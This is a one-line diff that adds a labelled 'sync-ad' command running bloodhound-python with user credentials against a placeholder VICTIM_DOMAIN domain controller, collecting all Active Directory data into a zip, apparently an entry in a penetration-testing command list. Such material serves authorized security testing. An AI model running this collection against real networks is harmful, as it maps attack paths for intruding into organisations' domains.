@@ -1,0 +1,1 @@
+sync-ad bloodhound-python -u 'USER' -p 'PASSWORD' -dc dc.VICTIM_DOMAIN -d VICTIM_DOMAIN -ns VICTIM_IP -c all --zip
